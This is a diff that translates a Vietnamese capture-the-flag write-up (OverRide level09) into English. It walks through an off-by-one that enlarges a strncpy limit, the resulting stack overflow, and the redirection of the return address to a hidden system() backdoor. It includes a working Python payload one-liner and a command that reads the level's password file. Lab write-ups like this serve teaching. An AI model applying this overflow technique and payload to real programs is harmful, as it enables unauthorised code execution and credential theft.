@@ -4,17 +4,18 @@ Partial RELRO 🟡  No canary found 🔴     NX enabled 🟢     PIE enabled �
 
 ------------
 
-# Nhật ký giải OverRide Level09 🏴
+# OverRide Level09 Log 🏴
 
-## Tổng quan
+## Overview
 
-Đây là một bài **binary exploitation** trên Linux 64-bit. Mục tiêu là đọc file `/home/users/end/.pass` bằng cách khai thác lỗ hổng trong chương trình `level09`.
+This is a **binary exploitation** challenge on 64-bit Linux. The goal is to read
+`/home/users/end/.pass` by exploiting a vulnerability in the `level09` program.
 
 ---
 
-## Bước 1: Trinh sát - Hiểu chương trình làm gì
+## Step 1: Recon — understand what the program does
 
-Chạy thử chương trình:
+Run it:
 ```
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
@@ -27,195 +28,199 @@ Chạy thử chương trình:
 >: Msg sent!
 ```
 
-Chương trình đơn giản: nhập username → nhập message → gửi. Không có gì đặc biệt... **nhưng trong code thì có!**
+The program is simple: enter a username → enter a message → send. Nothing
+special... **but the code tells a different story!**
 
 ---
 
-## Bước 2: Đọc code (Ghidra decompile)
+## Step 2: Read the code (Ghidra decompile)
 
-Có 4 hàm quan trọng:
+There are 4 important functions:
 
-### 🔑 `secret_backdoor` - Hàm ẩn không bao giờ được gọi
+### 🔑 `secret_backdoor` — a hidden function that is never called
 ```c
 void secret_backdoor(void) {
     char local_88[128];
     fgets(local_88, 0x80, stdin);
-    system(local_88);  // ← Chạy bất kỳ lệnh shell nào!
+    system(local_88);  // ← runs any shell command!
 }
 ```
-Hàm này **không bao giờ được gọi** trong luồng bình thường, nhưng nếu ta nhảy vào được thì có thể chạy lệnh tùy ý → đọc được flag!
+This function is **never called** in the normal flow, but if we can jump into it
+we can run arbitrary commands → read the flag!
 
 ---
 
-### 🏠 `handle_msg` - Hàm trung tâm
+### 🏠 `handle_msg` — the central function
 ```c
 void handle_msg(void) {
-    undefined1 local_c8[140];  // ← buffer chính, là 1 struct
+    undefined1 local_c8[140];  // ← main buffer, used as a struct
     // ...
-    undefined4 local_14 = 0x8c;  // ← con số giới hạn, ở offset +0xb4
+    undefined4 local_14 = 0x8c;  // ← the limit value, at offset +0xb4
     
     set_username(local_c8);
     set_msg(local_c8);
 }
 ```
 
-Buffer `local_c8` được dùng như một **struct** với layout:
+The buffer `local_c8` is used as a **struct** with this layout:
 ```
-Offset 0x00 → 0x8b  : vùng chứa message (140 bytes)
-Offset 0x8c → 0xb3  : vùng chứa username (40 bytes)  
-Offset 0xb4         : local_14 = 0x8c = 140 (giới hạn copy)
+Offset 0x00 → 0x8b  : message area (140 bytes)
+Offset 0x8c → 0xb3  : username area (40 bytes)  
+Offset 0xb4         : local_14 = 0x8c = 140 (the copy limit)
 ```
 
 ---
 
-### 👤 `set_username` - Chứa lỗ hổng đầu tiên
+### 👤 `set_username` — contains the first vulnerability
 ```c
 void set_username(long param_1) {
     char local_98[140];
     int local_c;
     
-    fgets(local_98, 0x80, stdin);  // đọc tối đa 128 bytes
+    fgets(local_98, 0x80, stdin);  // read up to 128 bytes
     
-    // Vòng lặp copy vào param_1 + 0x8c (vùng username)
+    // Loop copying into param_1 + 0x8c (the username area)
     for (local_c = 0; (local_c < 0x29 && local_98[local_c] != '\0'); local_c++) {
         *(char*)(param_1 + 0x8c + local_c) = local_98[local_c];
     }
 }
 ```
 
-**Điểm mấu chốt:** `0x29 = 41` lần lặp, ghi vào `param_1 + 0x8c + 0` đến `param_1 + 0x8c + 40`.
+**Key point:** `0x29 = 41` iterations, writing into `param_1 + 0x8c + 0` through
+`param_1 + 0x8c + 40`.
 
-Nhưng `local_14` nằm ở `param_1 + 0xb4`:
+But `local_14` lives at `param_1 + 0xb4`:
 ```
 0x8c + 40 = 0x8c + 0x28 = 0xb4  ✓
 ```
-→ **Byte thứ 41 của username ghi đúng vào `local_14`!**
+→ **The 41st byte of the username writes exactly into `local_14`!**
 
-Nếu byte thứ 41 là `\xff` (= 255), thì `local_14` bị đổi từ `140` thành `255`.
+If the 41st byte is `\xff` (= 255), `local_14` changes from `140` to `255`.
 
 ---
 
-### ✉️ `set_msg` - Chứa lỗ hổng thứ hai
+### ✉️ `set_msg` — contains the second vulnerability
 ```c
 void set_msg(char *param_1) {
     char local_408[1024];
     
-    fgets(local_408, 0x400, stdin);  // đọc tối đa 1024 bytes
+    fgets(local_408, 0x400, stdin);  // read up to 1024 bytes
     strncpy(param_1, local_408, (long)*(int*)(param_1 + 0xb4));
-    //                           ↑ đọc local_14 làm giới hạn!
+    //                           ↑ reads local_14 as the limit!
 }
 ```
 
-`strncpy` copy tối đa `local_14` bytes. Nếu ta đã đổi `local_14` thành `255`, nó sẽ copy **255 bytes** vào buffer chỉ có 140 bytes → **Buffer Overflow!**
+`strncpy` copies at most `local_14` bytes. If we changed `local_14` to `255`, it
+copies **255 bytes** into a buffer only 140 bytes wide → **buffer overflow!**
 
 ---
 
-## Bước 3: Vẽ bản đồ stack
+## Step 3: Map the stack
 
 ```
 handle_msg stack frame:
 ┌─────────────────────────────┐  ← rbp - 0xc0
 │  local_c8[140]              │  offset +0x00: message (140 bytes)
 │  ...                        │
-│  ───────────── offset 0x8c  │  ← vùng username bắt đầu
+│  ───────────── offset 0x8c  │  ← username area begins
 │  username[40]               │  40 bytes
 │  ───────────── offset 0xb4  │
-│  local_14 = 0x8c (4 bytes)  │  ← bị ghi đè bởi username[40]
+│  local_14 = 0x8c (4 bytes)  │  ← overwritten by username[40]
 │  ...padding...              │
 ├─────────────────────────────┤  ← rbp
 │  saved RBP (8 bytes)        │
 ├─────────────────────────────┤  ← rbp + 8
-│  return address (8 bytes)   │  ← MỤC TIÊU CẦN GHI ĐÈ
+│  return address (8 bytes)   │  ← TARGET TO OVERWRITE
 └─────────────────────────────┘
 ```
 
-**Tính offset từ đầu buffer đến return address:**
-- `local_c8` ở `rbp - 0xc0` → cách rbp `0xc0 = 192` bytes
-- return address ở `rbp + 8`
-- Tổng: `192 + 8 = 200` bytes padding, sau đó là return address
+**Offset from the start of the buffer to the return address:**
+- `local_c8` is at `rbp - 0xc0` → `0xc0 = 192` bytes from rbp
+- the return address is at `rbp + 8`
+- total: `192 + 8 = 200` bytes of padding, then the return address
 
 ---
 
-## Bước 4: Kiểm tra bảo vệ
+## Step 4: Check protections
 
 ```bash
-# Kết quả checksec:
+# checksec result:
 Partial RELRO 🟡  
-No canary    🔴  ← Không có stack canary → overflow dễ hơn!
-NX enabled   🟢  ← Không chạy shellcode trực tiếp được
-PIE enabled  🟢  ← Địa chỉ thay đổi mỗi lần chạy
+No canary    🔴  ← no stack canary → overflow is easier!
+NX enabled   🟢  ← can't execute injected shellcode directly
+PIE enabled  🟢  ← addresses change on every run
 ```
 
-**PIE enabled** là thách thức: địa chỉ `secret_backdoor` không cố định.
+**PIE enabled** is the challenge: the address of `secret_backdoor` is not fixed.
 
 ---
 
-## Bước 5: Tìm địa chỉ thực của secret_backdoor
+## Step 5: Find the real address of secret_backdoor
 
-Vì PIE, ta cần tìm **base address** lúc runtime:
+Because of PIE, we need the **base address** at runtime:
 
 ```bash
 gdb -q ./level09
 (gdb) break main
 (gdb) run
 (gdb) info proc mappings
-# → Start Addr: 0x555555554000  ← đây là base!
+# → Start Addr: 0x555555554000  ← this is the base!
 
 (gdb) p secret_backdoor
 # → offset: 0x88c
 ```
 
-Địa chỉ thực:
+Real address:
 ```
 0x555555554000 + 0x88c = 0x55555555488c
 ```
 
-Kiểm tra ASLR:
+Check ASLR:
 ```bash
 cat /proc/sys/kernel/randomize_va_space
-# → 0  ← ASLR tắt! Địa chỉ cố định mỗi lần chạy → exploit ổn định
+# → 0  ← ASLR is off! The address is fixed on every run → stable exploit
 ```
 
 ---
 
-## Bước 6: Xây dựng payload
+## Step 6: Build the payload
 
-Exploit gồm **3 phần** gửi vào stdin:
+The exploit has **3 parts** sent to stdin:
 
 ```
-Phần 1 - USERNAME:
+Part 1 - USERNAME:
 'A' × 40 + '\xff'
-└─ 40 ký tự bình thường để fill vùng username
-└─ byte '\xff' = 255 ghi vào local_14, tăng giới hạn strncpy lên 255
+└─ 40 normal characters to fill the username area
+└─ the '\xff' byte = 255 written into local_14, raising the strncpy limit to 255
 
-Phần 2 - MESSAGE:
-'B' × 200 + địa_chỉ_secret_backdoor (8 bytes, little-endian)
-└─ 200 bytes padding để đến đúng vị trí return address
-└─ 8 bytes địa chỉ ghi đè return address
+Part 2 - MESSAGE:
+'B' × 200 + secret_backdoor_address (8 bytes, little-endian)
+└─ 200 bytes of padding to reach the return address
+└─ 8 bytes of address to overwrite the return address
 
-Phần 3 - LỆNH (sau khi nhảy vào secret_backdoor):
+Part 3 - COMMAND (after jumping into secret_backdoor):
 'cat /home/users/end/.pass\n'
-└─ secret_backdoor gọi fgets rồi system() với input này
+└─ secret_backdoor calls fgets then system() with this input
 ```
 
 ---
 
-## Bước 7: Chạy exploit
+## Step 7: Run the exploit
 
 ```bash
-# Bước 1: payload overflow + giữ stdin mở
+# Step 1: overflow payload + keep stdin open
 (python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09
 
-# Bước 2: sau khi secret_backdoor() gọi fgets(), gõ lệnh muốn chạy:
+# Step 2: after secret_backdoor() calls fgets(), type the command you want to run:
 cat /home/users/end/.pass | cat
 ```
 
-- `<` = little-endian (x86 lưu bytes từ thấp đến cao)
-- Biến `0x55555555488c` thành `\x8c\x48\x55\x55\x55\x55\x00\x00`
+- little-endian = x86 stores bytes from low to high
+- `0x55555555488c` becomes `\x8c\x48\x55\x55\x55\x55\x00\x00`
 
 ---
 
-## Sơ đồ luồng tấn công
+## Attack flow diagram
 
 ```
 set_username()                    set_msg()
@@ -223,26 +228,26 @@ set_username()                    set_msg()
      │  username = 'A'*40 + '\xff'    │  msg = 'B'*200 + addr
      │                                │
      ▼                                ▼
-local_14 bị đổi              strncpy copy 255 bytes
-  0x8c → 0xff                  tràn qua saved RBP
-                                  └→ ghi đè return address
+local_14 changed             strncpy copies 255 bytes
+  0x8c → 0xff                  overflows past saved RBP
+                                  └→ overwrites return address
                                          │
                                          ▼
-                               ret nhảy vào secret_backdoor()
+                               ret jumps into secret_backdoor()
                                          │
                                          ▼
-                               fgets() đọc "cat /home/users/end/.pass"
+                               fgets() reads "cat /home/users/end/.pass"
                                          │
                                          ▼
-                               system() chạy lệnh → in flag! 🎉
+                               system() runs the command → prints the flag! 🎉
 ```
 
 ---
 
-## Tóm tắt các lỗ hổng
+## Vulnerability summary
 
-| Lỗ hổng | Vị trí | Nguyên nhân |
+| Vulnerability | Location | Cause |
 |---|---|---|
-| Off-by-one | `set_username` | Loop đến `0x29=41` nhưng username chỉ có 40 bytes |
-| Buffer Overflow | `set_msg` | `strncpy` dùng giá trị bị kiểm soát bởi attacker |
-| Không có canary | Binary | Không phát hiện được stack overflow |
+| Off-by-one | `set_username` | Loop runs to `0x29=41` but the username is only 40 bytes |
+| Buffer overflow | `set_msg` | `strncpy` uses an attacker-controlled length |
+| No canary | Binary | Stack overflow goes undetected |
